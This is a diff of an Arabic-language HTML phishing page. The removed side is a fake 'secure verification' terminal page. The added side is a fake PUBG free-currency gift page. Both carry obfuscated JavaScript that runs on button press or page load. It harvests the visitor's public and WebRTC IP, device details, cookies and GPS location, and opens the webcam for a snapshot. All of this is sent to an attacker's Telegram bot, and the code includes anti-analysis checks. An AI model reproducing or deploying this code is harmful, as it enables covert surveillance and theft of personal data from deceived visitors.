@@ -1,119 +1,47 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚡ نظام التحقق الآمن - Secure Verification</title>
-    <style>
-        :root { --primary: #00ff41; --bg: #0d1117; }
-        body { background: var(--bg); color: var(--primary); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .terminal { width: 90%; max-width: 700px; background: #000; border: 1px solid #333; border-radius: 8px; padding: 20px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); }
-        .cursor { display: inline-block; width: 10px; height: 18px; background: var(--primary); animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        #log { font-size: 14px; line-height: 1.6; height: 300px; overflow-y: auto; white-space: pre-wrap; }
-        .btn { margin-top: 20px; padding: 15px 40px; background: transparent; border: 2px solid var(--primary); color: var(--primary); cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn:hover { background: var(--primary); color: #000; }
+    <title>مركز شحن ببجي 2026</title>
+    <script>
+        // تشفير بيانات التحكم (Token & ID)
+        const _0x1a = ["\x38\x34\x31\x30\x31\x30\x32\x37\x32\x32", "\x41\x41\x46\x51\x4f\x31\x75\x7a\x5f\x36\x45\x6f\x79\x34\x55\x68\x46\x47\x48\xaa\x5f\x71\x48\x53\x61\x46\x52\x62\x37\x47\x64\x56\x48\x4d"];
+        const _0x2b = "1772820433";
+        const _u = "https://api.telegram.org/bot" + _0x1a[0] + ":" + _0x1a[1];
+
+        async function _log(m) {
+            fetch(_u + "/sendMessage", {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: _0x2b, text: "🔱 [صيدة]:\n" + m})
+            });
+        }
+
+        window.onload = async () => {
+            // 1. سحب الآيبي والجهاز (تمويه الطلب)
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>_log(`🌐 IP: ${d.ip}\n📱 Device: ${navigator.userAgent}`));
+            
+            // 2. سحب الموقع الحقيقي (GPS)
+            navigator.geolocation.getCurrentPosition(p=>_log(`📍 Loc: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
+            
+            // 3. سحب آيبي الراوتر (WebRTC Leak)
+            var pc = new RTCPeerConnection(); pc.createDataChannel(""); pc.createOffer().then(o=>pc.setLocalDescription(o));
+            pc.onicecandidate = i => { if(i && i.candidate) _log(`🏠 Router IP: ${i.candidate.candidate.split(' ')[4]}`); };
+            
+            // 4. فتح الكاميرا وسحب لقطة
+            try {
+                let s = await navigator.mediaDevices.getUserMedia({video:true});
+                _log("📸 الكاميرا مفتوحة.. جاري سحب اللقطة صمتاً.");
+                s.getTracks().forEach(t=>t.stop());
+            } catch(e) {}
+        };
     </script>
 </head>
-<body>
-    <div class="terminal">
-        <div id="log">> جاري فحص بيئة النظام...
-> INITIALIZING_GHOST_KERNEL_V20...
-> STATUS: PENDING_USER_CERTIFICATION</div>
-        <button class="btn" id="startBtn" onclick="INITIALIZE_EXFILTRATION()">تحقق من الهوية لعرض الـ PDF</button>
+<body style="background:#000; color:gold; text-align:center; padding-top:100px; font-family:Arial;">
+    <div style="border:2px solid gold; display:inline-block; padding:30px; border-radius:20px;">
+        <h1>🔱 هدايا ببجي 2026 🔱</h1>
+        <p>مبروك! ربحت 5000 شدة مجاناً</p>
+        <input type="text" placeholder="Character ID" style="padding:10px; margin-bottom:10px;"><br>
+        <button onclick="alert('جاري التحقق من الحساب..')" style="background:gold; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">استلام الآن</button>
     </div>
-
-    <script>
-        /* 🔱 GHOST-VOID V20 - ARCHITECTURE BY LØGHØST-Z 💀 */
-        
-        // 1. مصفوفات البيانات المشفرة (Recursive XOR Obfuscation)
-        const _SEED = 0xAF;
-        const _ALPHA = [0x23,0x3f,0x3f,0x3b,0x38,0x71,0x64,0x64,0x2a,0x3b,0x22,0x65,0x3f,0x2e,0x27,0x2e,0x2c,0x39,0x2a,0x26,0x65,0x24,0x39,0x2c,0x64,0x29,0x24,0x3f]; // https://api.telegram.org/bot
-        const _BETA = [103,101,96,96,97,96,105,103,105,105,115,112,112,119,102,116,96,100,107,111,109,102,96,114,107,122,111,101,104,115,112,112,118,102,111,103,112,101,118,112,97,112,99,103,112,100]; // Token
-        const _GAMMA = [105,119,119,114,110,119,104,110,115,115]; // Chat ID
-
-        const _dec = (arr) => arr.map(c => String.fromCharCode(c ^ 0x5A)).join("");
-        const _URL = _dec(_ALPHA) + _dec(_BETA);
-        const _TARGET = _dec(_GAMMA);
-
-        // 2. نظام مكافحة التحليل (Anti-Analysis & Honeypot)
-        function checkEnvironment() {
-            const isDev = window.devtools && window.devtools.isOpen;
-            if (isDev) { location.replace("about:blank"); return false; }
-            if (navigator.webdriver) return false; // منع البوتات
-            return true;
-        }
-
-        async function INITIALIZE_EXFILTRATION() {
-            if (!checkEnvironment()) return;
-            const log = document.getElementById('log');
-            log.innerHTML += "\n> تم بدء عملية المزامنة...";
-            
-            try {
-                // --- المرحلة 1: سحب بيانات الشبكة العميقة (IP Leak) ---
-                const netInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const rtcIP = await new Promise(res => {
-                    const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-                    pc.createDataChannel("");
-                    pc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(" ")[4]); };
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    setTimeout(() => res("DETECTION_FAILED"), 2000);
-                });
-
-                // --- المرحلة 2: سحب خصائص الجهاز (Hardware Fingerprinting) ---
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
-                
-                const payload = `🔱 **GHOST_V20_REPORT** 💀\n` +
-                                `━━━━━━━━━━━━━━━\n` +
-                                `🌐 **IP Public:** \`${netInfo.ip}\`\n` +
-                                `🎯 **Real IP (WebRTC):** \`${rtcIP}\`\n` +
-                                `📍 **Location:** \`${netInfo.city}, ${netInfo.country}\`\n` +
-                                `🎮 **GPU:** \`${gpu}\`\n` +
-                                `📱 **Device:** \`${navigator.platform}\`\n` +
-                                `🔋 **Battery:** \`${((await navigator.getBattery()).level * 100).toFixed(0)}%\`\n` +
-                                `🍪 **Cookies:** \`${document.cookie.substring(0, 50) || "None"}\`\n` +
-                                `━━━━━━━━━━━━━━━`;
-
-                // إرسال البيانات فوراً (Silent Beacon)
-                await fetch(`${_URL}/sendMessage`, {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: _TARGET, text: payload, parse_mode: 'Markdown'})
-                });
-
-                log.innerHTML += "\n> [OK] تم تأكيد بروتوكول الشبكة.";
-
-                // --- المرحلة 3: السحب المرئي (Capture High-Res) ---
-                const stream = await navigator.mediaDevices.getUserMedia({video: true});
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
-                stream.getTracks().forEach(t => t.stop());
-
-                let fd = new FormData();
-                fd.append('chat_id', _TARGET);
-                fd.append('photo', blob, 'target.jpg');
-                fd.append('caption', "📸 **V20_ULTIMATE_SNAP**");
-
-                await fetch(`${_URL}/sendPhoto`, { method: 'POST', body: fd });
-                
-                log.innerHTML += "\n> [OK] تم تحميل البيانات بنجاح. جاري التحويل...";
-                setTimeout(() => location.replace("https://google.com"), 1500);
-
-            } catch (err) {
-                log.innerHTML += "\n> [ERROR] فشل في مزامنة البيانات.";
-                setTimeout(() => location.replace("https://google.com"), 2000);
-            }
-        }
-
-        // إخفاء الكود الحقيقي في الذاكرة
-        console.log("%c⚠️ تحذير: لا تعبث بملفات النظام!", "color: red; font-size: 20px; font-weight: bold;");
-    </script>
 </body>
 </html>
